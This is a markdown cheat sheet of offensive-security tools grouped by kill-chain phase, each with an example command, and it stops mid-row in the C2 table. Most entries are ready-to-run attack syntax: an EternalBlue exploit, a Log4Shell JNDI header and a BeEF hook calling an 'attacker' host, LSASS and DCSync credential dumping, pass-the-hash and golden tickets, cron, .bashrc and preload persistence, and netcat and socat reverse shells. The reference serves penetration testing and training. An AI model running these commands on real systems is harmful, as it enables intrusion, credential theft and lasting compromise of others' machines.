# Offensive-Security Tool Inventory by Kill-Chain Phase

Below is a categorized inventory of well-known offensive-security tooling mapped to kill-chain phases, with representative invocation syntax. Use only on systems you are authorized to test. Many of these are dual-use and some are flagged by AV/EDR; syntax shown is illustrative of common usage, not a guarantee of success against modern defenses.

---

## 1. Reconnaissance (OSINT / passive / active discovery)

| Tool | Example invocation | Best at |
|---|---|---|
| **nmap** (host discovery) | `nmap -sn 10.0.0.0/24` | Fast ping-sweep host discovery |
| **masscan** | `masscan -p1-65535 10.0.0.0/24 --rate=10000 -oL out.txt` | Internet-scale port scanning at high rate |
| **amass** | `amass enum -d example.com -o subs.txt` | Subdomain enumeration / attack-surface mapping |
| **subfinder** | `subfinder -d example.com -all -o subs.txt` | Passive subdomain discovery from many sources |
| **assetfinder** | `assetfinder --subs-only example.com` | Quick passive subdomain pull |
| **dnsx** | `dnsx -l subs.txt -a -resp` | Bulk DNS resolution/validation |
| **httpx** | `httpx -l subs.txt -title -tech-detect -status-code` | Probing live HTTP services and fingerprinting |
| **theHarvester** | `theHarvester -d example.com -b all -f out.html` | Email/host/employee OSINT aggregation |
| **recon-ng** | `recon-ng` → `use recon/domains-hosts/hackertarget` | Modular OSINT framework |
| **shodan** CLI | `shodan search 'org:"Example Inc"'` | Internet-exposed asset discovery |
| **censys** CLI | `censys search 'services.service_name: HTTP'` | Certificate/host intelligence |
| **whois** | `whois example.com` | Registration/ownership data |
| **dig** | `dig +short AXFR @ns1.example.com example.com` | DNS zone transfer attempts, record enumeration |
| **fierce** | `fierce --domain example.com` | DNS recon / zone walking |
| **dnsrecon** | `dnsrecon -d example.com -t std,brt` | DNS enumeration with brute force |
| **wafw00f** | `wafw00f https://example.com` | WAF fingerprinting |
| **whatweb** | `whatweb -a 3 https://example.com` | Web tech fingerprinting |
| **gobuster** (vhost) | `gobuster vhost -u https://example.com -w vhosts.txt` | Virtual-host discovery |
| **eyewitness** | `eyewitness --web -f urls.txt` | Screenshot/collect web recon at scale |
| **aquatone** | `cat urls.txt | aquatone` | Visual recon of HTTP services |
| **spiderfoot** | `spiderfoot -s example.com -t DOMAIN_NAME` | Automated OSINT correlation |
| **maltego** | GUI (graph transforms) | Link-analysis OSINT |
| **trufflehog** | `trufflehog github --org=example` | Secret discovery in repos (pre-engagement recon) |

---

## 2. Enumeration (service / protocol / directory)

| Tool | Example invocation | Best at |
|---|---|---|
| **nmap** (service/version) | `nmap -sV -sC -p- -oA scan 10.0.0.5` | Service/version + default NSE scripts |
| **nmap NSE** | `nmap --script smb-enum-shares,smb-enum-users -p445 10.0.0.5` | Protocol-specific enumeration via NSE |
| **enum4linux-ng** | `enum4linux-ng -A 10.0.0.5` | SMB/NetBIOS/RPC enumeration |
| **smbclient** | `smbclient -L //10.0.0.5 -N` | SMB share listing |
| **smbmap** | `smbmap -H 10.0.0.5 -u guest -p ''` | SMB share permissions mapping |
| **rpcclient** | `rpcclient -U '' -N 10.0.0.5` → `enumdomusers` | RPC/SAMR enumeration |
| **ldapsearch** | `ldapsearch -x -H ldap://10.0.0.5 -b "dc=example,dc=com"` | LDAP directory enumeration |
| **ldapdomaindump** | `ldapdomaindump -u 'DOMAIN\user' -p pass ldap://dc` | AD LDAP dump to HTML/JSON |
| **bloodhound-python** | `bloodhound-python -u user -p pass -d example.com -ns 10.0.0.5 -c All` | AD relationship collection |
| **SharpHound** | `SharpHound.exe -c All` | AD collector (Windows) |
| **crackmapexec / nxc** | `nxc smb 10.0.0.0/24 -u user -p pass --shares` | SMB/WinRM/LDAP/MSSQL swiss-army enumeration |
| **snmpwalk** | `snmpwalk -v2c -c public 10.0.0.5` | SNMP enumeration |
| **onesixtyone** | `onesixtyone -c community.txt 10.0.0.0/24` | SNMP community brute |
| **nikto** | `nikto -h https://example.com -ssl` | Web server misconfig/vuln scan |
| **gobuster** (dir) | `gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html` | Directory/file brute force |
| **feroxbuster** | `feroxbuster -u https://example.com -w wordlist.txt -x php` | Recursive content discovery |
| **ffuf** | `ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,403` | Fast fuzzing (dirs, params, vhosts) |
| **dirsearch** | `dirsearch -u https://example.com -e php,asp` | Web path discovery |
| **wfuzz** | `wfuzz -c -w wordlist.txt --hc 404 https://example.com/FUZZ` | Web fuzzing |
| **arjun** | `arjun -u https://example.com/api` | HTTP parameter discovery |
| **nuclei** | `nuclei -u https://example.com -t cves/ -severity high,critical` | Template-based vuln/tech enumeration |
| **wpscan** | `wpscan --url https://example.com --enumerate vp,vt,u` | WordPress enumeration |
| **joomscan** | `joomscan -u https://example.com` | Joomla enumeration |
| **droopescan** | `droopescan scan drupal -u https://example.com` | Drupal enumeration |
| **redis-cli** | `redis-cli -h 10.0.0.5 info` | Redis enumeration |
| **mongo** / mongosh | `mongosh --host 10.0.0.5 --eval 'db.adminCommand({listDatabases:1})'` | MongoDB enumeration |
| **ftp** / **lftp** | `lftp -u anonymous, 10.0.0.5` | FTP anonymous enumeration |
| **ssh-audit** | `ssh-audit 10.0.0.5` | SSH config/cipher audit |
| **ike-scan** | `ike-scan 10.0.0.5` | IPsec/IKE enumeration |
| **kerbrute** | `kerbrute userenum -d example.com --dc 10.0.0.5 users.txt` | Kerberos user enumeration |
| **GetNPUsers.py** | `GetNPUsers.py example.com/ -usersfile users.txt -dc-ip 10.0.0.5 -no-pass` | AS-REP roastable user discovery |
| **GetUserSPNs.py** | `GetUserSPNs.py example.com/user:pass -dc-ip 10.0.0.5 -request` | SPN / Kerberoastable account discovery |
| **windapsearch** | `windapsearch.py -d example.com --dc-ip 10.0.0.5 -U` | LDAP AD enumeration |

---

## 3. Exploitation

| Tool | Example invocation | Best at |
|---|---|---|
| **Metasploit** | `msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run"` | Modular exploit framework |
| **searchsploit** | `searchsploit apache 2.4.49` | Local Exploit-DB search |
| **sqlmap** | `sqlmap -u "https://example.com/?id=1" --batch --dbs` | SQL injection exploitation |
| **BeEF** | `./beef` (hook: `<script src="http://attacker:3000/hook.js">`) | Browser exploitation framework |
| **XSStrike** | `python xsstrike.py -u "https://example.com/?q=test"` | XSS detection/exploitation |
| **commix** | `commix --url="https://example.com/?cmd=1"` | OS command injection |
| **ysoserial** | `java -jar ysoserial.jar CommonsCollections5 'cmd' > payload.ser` | Java deserialization payloads |
| **ysoserial.net** | `ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c calc` | .NET deserialization payloads |
| **marshalsec** | `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker/#Exploit 1389` | JNDI/LDAP exploit server |
| **log4shell (JNDI)** | `curl 'https://target/' -H 'X-Api: ${jndi:ldap://attacker:1389/a}'` | Log4j exploitation |
| **CVE PoCs** | `python3 CVE-2021-44228.py -u https://target` | Targeted CVE exploitation |
| **impacket-psexec** | `psexec.py example.com/user:pass@10.0.0.5` | Remote Windows exec via SMB |
| **impacket-wmiexec** | `wmiexec.py example.com/user:pass@10.0.0.5` | WMI-based remote exec |
| **impacket-smbexec** | `smbexec.py example.com/user:pass@10.0.0.5` | SMB service exec |
| **impacket-atexec** | `atexec.py example.com/user:pass@10.0.0.5 'whoami'` | Task-scheduler remote exec |
| **evil-winrm** | `evil-winrm -i 10.0.0.5 -u user -p pass` | WinRM shell |
| **pwncat-cs** | `pwncat-cs -lp 4444` | Post-exploitation shell handler |
| **CrackMapExec / nxc** | `nxc smb 10.0.0.5 -u user -p pass -x 'whoami'` | Authenticated exec across protocols |
| **Responder** | `responder -I eth0 -wv` | LLMNR/NBT-NS/mDNS poisoning |
| **mitm6** | `mitm6 -d example.com` | IPv6 DHCPv6 spoofing for AD |
| **ntlmrelayx** | `ntlmrelayx.py -tf targets.txt -smb2support` | NTLM relay |
| **ettercap** | `ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.2//` | MITM/ARP poisoning |
| **bettercap** | `bettercap -iface eth0` → `net.probe on` | MITM framework |
| **arpspoof** | `arpspoof -i eth0 -t 10.0.0.5 10.0.0.1` | ARP spoofing |
| **aircrack-ng suite** | `airmon-ng start wlan0` | Wi-Fi attacks |
| **wifite** | `wifite --kill` | Automated Wi-Fi attacks |
| **hashcat** | `hashcat -m 1000 ntlm.txt rockyou.txt` | Password cracking (see cred access) |
| **john** | `john --wordlist=rockyou.txt hashes.txt` | Password cracking |
| **hydra** | `hydra -l admin -P pass.txt ssh://10.0.0.5` | Online password brute force |
| **medusa** | `medusa -h 10.0.0.5 -u admin -P pass.txt -M ssh` | Online brute force |
| **crowbar** | `crowbar -b rdp -s 10.0.0.5/32 -u admin -C pass.txt` | RDP/SSH/VNC brute |
| **patator** | `patator ssh_login host=10.0.0.5 user=admin password=FILE0 0=pass.txt` | Modular brute forcer |

---

## 4. Credential Access

| Tool | Example invocation | Best at |
|---|---|---|
| **mimikatz** | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit` | Windows credential extraction |
| **secretsdump.py** | `secretsdump.py example.com/user:pass@10.0.0.5 -just-dc-ntlm` | DCSync / SAM / LSA secrets |
| **lsassy** | `lsassy -u user -p pass 10.0.0.5` | Remote LSASS dumping |
| **pypykatz** | `pypykatz lsa minidump lsass.dmp` | Offline LSASS parsing |
| **procdump** | `procdump.exe -ma lsass.exe lsass.dmp` | LSASS dump |
| **comsvcs.dll** | `rundll32 comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full` | LOLBin LSASS dump |
| **nanodump** | `nanodump.x64.exe --write lsass.dmp` | Stealthy LSASS dump |
| **Rubeus** | `Rubeus.exe kerberoast /outfile:spns.txt` | Kerberos abuse (roast, asktgt, ptt) |
| **GetNPUsers.py** | `GetNPUsers.py example.com/ -usersfile u.txt -no-pass -dc-ip 10.0.0.5` | AS-REP roasting |
| **GetUserSPNs.py** | `GetUserSPNs.py example.com/user:pass -request -dc-ip 10.0.0.5` | Kerberoasting |
| **hashcat** | `hashcat -m 13100 kerb.txt rockyou.txt` | Offline cracking (Kerberoast) |
| **john** | `john --format=krb5asrep hashes.txt` | Offline cracking (AS-REP) |
| **responder** | `responder -I eth0 -wv` | NTLMv2 capture |
| **Inveigh** | `Invoke-Inveigh -ConsoleOutput Y` | Windows LLMNR/NBNS spoofing |
| **ntlmrelayx** | `ntlmrelayx.py -t smb://10.0.0.5 -smb2support` | Relay captured NTLM |
| **LaZagne** | `laZagne.exe all` | Local app credential recovery |
| **SharpDPAPI** | `SharpDPAPI.exe machinemasterkeys` | DPAPI secret extraction |
| **DonPAPI** | `DonPAPI.py example.com/user:pass@10.0.0.5` | Remote DPAPI secrets |
| **gpp-decrypt** | `gpp-decrypt <cpassword>` | GPP cpassword decrypt |
| **gosecretsdump** | `gosecretsdump -sam SAM -system SYSTEM` | Fast SAM dump |
| **creddump7** | `pwdump.py SYSTEM SAM` | Offline SAM parsing |
| **keytabextract** | `keytabextract.py file.keytab` | Kerberos keytab extraction |
| **linpeas / winpeas** | `./linpeas.sh` / `winPEASx64.exe` | Host credential/config discovery |
| **Lazagne (Linux)** | `python3 laZagne.py all` | Linux cred recovery |

---

## 5. Lateral Movement

| Tool | Example invocation | Best at |
|---|---|---|
| **impacket-psexec** | `psexec.py example.com/user:pass@10.0.0.5` | SMB service exec |
| **impacket-wmiexec** | `wmiexec.py example.com/user:pass@10.0.0.5` | WMI exec |
| **impacket-smbexec** | `smbexec.py example.com/user:pass@10.0.0.5` | SMB exec via service |
| **impacket-atexec** | `atexec.py example.com/user:pass@10.0.0.5 'cmd'` | Task scheduler exec |
| **impacket-dcomexec** | `dcomexec.py example.com/user:pass@10.0.0.5` | DCOM exec |
| **evil-winrm** | `evil-winrm -i 10.0.0.5 -u user -H <hash>` | WinRM (pass-the-hash) |
| **CrackMapExec / nxc** | `nxc smb 10.0.0.0/24 -u user -H <hash> -x 'whoami'` | Sprayed authenticated exec |
| **PsExec** | `PsExec.exe \\10.0.0.5 -u DOMAIN\user -p pass cmd.exe` | Sysinternals remote exec |
| **smbclient** | `smbclient //10.0.0.5/share -U user%pass` | SMB file access |
| **Rubeus** | `Rubeus.exe ptt /ticket:base64ticket` | Pass-the-ticket |
| **mimikatz** | `mimikatz "sekurlsa::pth /user:u /domain:d /ntlm:h /run:cmd"` | Pass-the-hash |
| **mimikatz** | `mimikatz "kerberos::ptt ticket.kirbi"` | Pass-the-ticket |
| **ticketer.py** | `ticketer.py -nthash h -domain-sid S -domain d Administrator` | Golden/silver ticket forge |
| **raiseChild.py** | `raiseChild.py example.com/user:pass` | Child→parent domain escalation |
| **secretsdump.py** | `secretsdump.py -k -no-pass dc.example.com` | Overpass-the-hash / DCSync |
| **ssh** | `ssh -o ProxyCommand='...' user@10.0.0.5` | SSH pivoting |
| **chisel** | `chisel client https://attacker:8080 R:socks` | TCP/UDP pivot over HTTP |
| **ligolo-ng** | `ligolo-ng -selfcert` (proxy) / `agent -connect attacker:11601` | TUN-based pivoting |
| **socat** | `socat TCP-LISTEN:8080,fork TCP:10.0.0.5:3389` | Port forwarding |
| **proxychains** | `proxychains4 nmap -sT -p445 10.0.0.6` | Route tools through SOCKS |
| **sshuttle** | `sshuttle -r user@10.0.0.5 10.0.0.0/24` | VPN-over-SSH pivot |
| **meterpreter** | `portfwd add -l 8080 -p 3389 -r 10.0.0.6` | Session-based pivoting |
| **dnscat2** | `dnscat2-server example.com` | DNS-tunnel C2/pivot |
| **WinRM (PS)** | `Enter-PSSession -ComputerName 10.0.0.5 -Credential $c` | Native WinRM |
| **wmiexec (PS)** | `Invoke-WmiMethod -ComputerName 10.0.0.5 ...` | Native WMI exec |

---

## 6. Persistence

| Tool | Example invocation | Best at |
|---|---|---|
| **Metasploit** | `use exploit/windows/local/persistence` | Modular persistence |
| **Empire / Starkiller** | `usemodule persistence/elevated/schtasks` | Post-exploitation framework persistence |
| **SharPersist** | `SharPersist.exe -t schtask -c "cmd.exe" -a "/c calc" -n "Updater"` | Windows persistence techniques |
| **schtasks** | `schtasks /create /tn Updater /tr "cmd.exe /c calc" /sc onlogon` | Scheduled task persistence |
| **reg add (Run key)** | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /d calc.exe` | Registry Run-key persistence |
| **sc create** | `sc create Upd binPath= "C:\path\svc.exe" start= auto` | Service persistence |
| **mimikatz** | `mimikatz "privilege::debug" "misc::skeleton"` | Skeleton key (domain) |
| **Rubeus** | `Rubeus.exe golden /...` | Golden ticket persistence |
| **ticketer.py** | `ticketer.py -nthash h -domain-sid S -domain d user` | Golden/silver ticket |
| **DSRM** | `vssadmin` / registry DSRM abuse | Domain controller persistence |
| **crontab** | `echo '* * * * * /tmp/x' | crontab -` | Linux cron persistence |
| **systemd** | `systemctl enable evil.service` | Linux service persistence |
| **.bashrc / .profile** | `echo '/tmp/x &' >> ~/.bashrc` | User-shell persistence |
| **SSH authorized_keys** | `echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys` | SSH key persistence |
| **PAM backdoor** | patch `pam_unix.so` | Linux auth persistence |
| **LD_PRELOAD** | `echo '/tmp/x.so' >> /etc/ld.so.preload` | Linux library hijack persistence |
| **WMI event subscription** | `wmic /namespace:\\root\subscription ...` | Fileless Windows persistence |
| **COM hijacking** | registry CLSID hijack | User-mode persistence |
| **DLL search order** | plant DLL in PATH | Hijack persistence |
| **Accessibility (sethc/osk)** | `copy cmd.exe sethc.exe` | Backdoor at logon screen |
| **Image File Execution Options** | `reg add "HKLM\...\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe` | IFEO persistence |
| **Winlogon Shell/Userinit** | registry modification | Logon persistence |
| **BITS jobs** | `bitsadmin /create /transfer ...` | Stealthy download/persistence |
| **WMI (PS)** | `Register-WmiEvent -Query ...` | Fileless persistence |
| **Empire (Linux)** | `usemodule persistence/userland/...` | Linux persistence modules |
| **pwncat-cs** | `persist` command | Cross-platform persistence helpers |

---

## 7. Command & Control (C2)

| Tool | Example invocation | Best at |
|---|---|---|
| **Cobalt Strike** | `teamserver <ip> <pass>` + `./cobaltstrike` | Commercial adversary simulation |
| **Sliver** | `sliver-server` → `generate --mtls attacker:443 --os windows` | Open-source C2 (mTLS/HTTP/DNS/WG) |
| **Mythic** | `./mythic-cli start` | Modular C2 framework |
| **Havoc** | `./havoc server --profile profiles/havoc.yaotl` | Modern C2 (Demon agent) |
| **Metasploit** | `use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; run` | Meterpreter handler |
| **Empire** | `./empire` → `uselistener http` | PowerShell C2 |
| **Covenant** | `dotnet run` (web UI) | .NET C2 |
| **PoshC2** | `posh-server` / `posh -u user` | PowerShell C2 |
| **Brute Ratel** | GUI/licensed | Commercial C2 (EDR evasion) |
| **Nighthawk** | licensed | Commercial C2 |
| **merlin** | `merlin-server` / `merlin-agent` | HTTP/2 C2 (Go) |
| **dnscat2** | `dnscat2-server example.com` / `dnscat2 example.com` | DNS-tunnel C2 |
| **iodine** | `iodined -f 10.0.0.1 tunnel.example.com` | DNS tunnel |
| **chisel** | `chisel server -p 8080 --reverse` | HTTP-tunnel C2/pivot |
| **ligolo-ng** | `ligolo-ng -selfcert` / `agent -connect` | TUN pivot/C2 |
| **gost** | `gost -L=:8080` | Proxy/tunnel C2 |
| **socat** | `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh` | Simple reverse shell |
| **netcat** | `nc -lvnp 4444` / `nc attacker 4444 -e /bin/sh`